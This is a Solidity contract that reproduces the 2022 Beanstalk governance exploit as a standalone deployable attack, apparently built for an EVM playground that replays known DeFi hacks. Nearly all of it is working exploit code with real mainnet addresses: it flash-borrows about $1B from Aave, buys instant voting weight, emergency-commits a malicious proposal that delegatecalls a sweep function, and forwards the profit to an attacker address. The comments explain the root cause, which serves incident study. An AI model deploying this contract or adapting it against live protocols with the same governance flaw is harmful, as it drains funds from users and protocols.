// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2022-04-Beanstalk).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// (`attacker = address(this)`; the Aave flash-loan callback `executeOperation`
// and the malicious-proposal `sweep` both live on the test itself), so there is
// no standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack so the playground can deploy it and record `run()`.
// Logic and constants are copied verbatim from test/Beanstalk_exp.sol, with the
// minimal interfaces inlined (no imports) so it compiles anywhere.
//
// Root cause: Beanstalk governance granted voting weight (Stalk) the instant
// Beans were deposited — no lockup, no vesting — and a BIP could be
// emergency-committed in the same transaction with no timelock, executing
// arbitrary `_init` code via the Diamond facet. The attacker flash-borrowed
// ~$1B stables (Aave), minted Beans via the Bean/3Crv Curve metapool, deposited
// them for instant Stalk majority, proposed + emergency-committed a BIP whose
// `_init` was this contract (so the Diamond `delegatecall`s `sweep()`), and
// swept the protocol's non-Bean reserves.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface ICurvePool {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external returns (uint256);
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external returns (uint256);
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBeanStalk {
    function depositBeans(uint256) external;
    function deposit(address token, uint256 amount) external;
    function emergencyCommit(uint32 bip) external;
    function vote(uint32 bip) external;

    struct FacetCut {
        address facetAddress;
        uint8 action;
        bytes4[] functionSelectors;
    }

    function propose(
        FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    ) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

contract BeanstalkGovernance {
    // --- actors / constants (copied verbatim from the Foundry test) ---
    address public receiver; // attacker EOA; profit is forwarded here

    IERC20 private constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant crvbean = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 private constant threeCrv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);

    IUniswapV2Router private constant uniswapv2 =
        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    ICurvePool private constant threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool private constant bean3Crv_f = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IBeanStalk private constant beanstalk = IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    ILendingPool private constant aave =
        ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    uint32 private constant BIP = 18;
    uint256 private constant SEED_ETH = 75 ether;

    constructor(address _receiver) {
        receiver = _receiver;
    }

    // --- entrypoint (mirrors ContractTest.testExploit) ---
    // Payable: the attacker forwards the seed ETH (75 ether) as msg.value; the
    // playground recorder sends it via exploitContract.attackValueWei.
    function run() public payable {
        // 1. Swap 75 ETH -> BEAN on Uniswap to seed a small Stalk position so the
        //    attacker can `propose` a BIP (proposing requires Stalk).
        address[] memory path = new address[](2);
        path[0] = uniswapv2.WETH();
        path[1] = address(bean);
        uniswapv2.swapExactETHForTokens{value: SEED_ETH}(0, path, address(this), block.timestamp + 120);

        // 2. Deposit the seed Beans into the Beanstalk Silo for instant Stalk.
        bean.approve(address(beanstalk), type(uint256).max);
        beanstalk.depositBeans(bean.balanceOf(address(this)));

        // 3. Propose the malicious BIP: empty diamondCut, `_init` = this contract,
        //    `_calldata` = sweep.selector. When the BIP is committed, the Diamond
        //    facet `delegatecall`s this contract's `sweep` — arbitrary code run in
        //    the Diamond's storage context.
        IBeanStalk.FacetCut[] memory cut = new IBeanStalk.FacetCut[](0);
        beanstalk.propose(cut, address(this), abi.encodeWithSelector(this.sweep.selector), 3);

        // (The live attack waited ~24h for BIP #18's vote-of-confidence window to
        // open before emergency-committing; the Foundry PoC warps block.timestamp.
        // In the single-block playground replay this gap cannot be simulated, so
        // emergencyCommit below runs against the just-proposed BIP at the same
        // timestamp — see the config's honesty note.)

        // 4. Approve the flash-borrowed stables everywhere they'll be routed.
        dai.approve(address(aave), type(uint256).max);
        usdc.approve(address(aave), type(uint256).max);
        usdt.approve(address(aave), type(uint256).max);
        bean.approve(address(aave), type(uint256).max);
        dai.approve(address(threeCrvPool), type(uint256).max);
        usdc.approve(address(threeCrvPool), type(uint256).max);
        usdt.approve(address(threeCrvPool), type(uint256).max);
        bean.approve(address(beanstalk), type(uint256).max);
        threeCrv.approve(address(bean3Crv_f), type(uint256).max);
        crvbean.approve(address(beanstalk), type(uint256).max);

        // 5. Flash-loan ~$1B stables from Aave. executeOperation is the callback.
        address[] memory assets = new address[](3);
        assets[0] = address(dai);
        assets[1] = address(usdc);
        assets[2] = address(usdt);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350_000_000 * 10 ** dai.decimals();
        amounts[1] = 500_000_000 * 10 ** usdc.decimals();
        amounts[2] = 150_000_000 * 10 ** usdt.decimals();
        uint256[] memory modes = new uint256[](3);
        aave.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);

        // 6. Forward the realized USDC profit to the attacker EOA.
        usdc.transfer(receiver, usdc.balanceOf(address(this)));
    }

    // --- Aave flash-loan callback (mirrors ContractTest.executeOperation) ---
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        // (a) Bundle the three stables into 3Crv via the 3pool.
        uint256[3] memory tempAmounts;
        tempAmounts[0] = amounts[0];
        tempAmounts[1] = amounts[1];
        tempAmounts[2] = amounts[2];
        threeCrvPool.add_liquidity(tempAmounts, 0);

        // (b) Convert 3Crv -> Bean/3Crv LP via the Curve metapool.
        uint256[2] memory tempAmounts2;
        tempAmounts2[0] = 0;
        tempAmounts2[1] = threeCrv.balanceOf(address(this));
        bean3Crv_f.add_liquidity(tempAmounts2, 0);

        // (c) Deposit the LP into the Beanstalk Silo — this is what grants the
        //     flash-loaned capital instant governance Stalk (the root cause).
        beanstalk.deposit(address(bean3Crv_f), crvbean.balanceOf(address(this)));

        // (d) Emergency-commit the BIP. The Diamond runs `sweep` (this contract)
        //     via delegatecall in its own storage context — arbitrary code
        //     execution gated only by Stalk majority, with no timelock.
        beanstalk.emergencyCommit(BIP);

        // (e) Unwind: pull the LP back out of Curve and split into stables.
        bean3Crv_f.remove_liquidity_one_coin(crvbean.balanceOf(address(this)), 1, 0);

        // (f) Repay the flash loan + Aave premium (0.09%) from the 3pool.
        tempAmounts[0] = amounts[0] + premiums[0];
        tempAmounts[1] = amounts[1] + premiums[1];
        tempAmounts[2] = amounts[2] + premiums[2];
        threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);

        // (g) Redeem any leftover 3Crv as USDC — the net arbitrage/drain profit.
        threeCrvPool.remove_liquidity_one_coin(threeCrv.balanceOf(address(this)), 1, 0);

        return true;
    }

    // --- malicious BIP payload (mirrors ContractTest.sweep) ---
    // Invoked by the Diamond's delegatecall when BIP #18 is committed; runs in
    // the Diamond's storage context. The live attacker swept ALL non-Bean
    // reserves here; the PoC verifies the path by recovering the Bean/3Crv LP.
    function sweep() external {
        crvbean.transfer(msg.sender, crvbean.balanceOf(address(this)));
    }

    receive() external payable {}
}
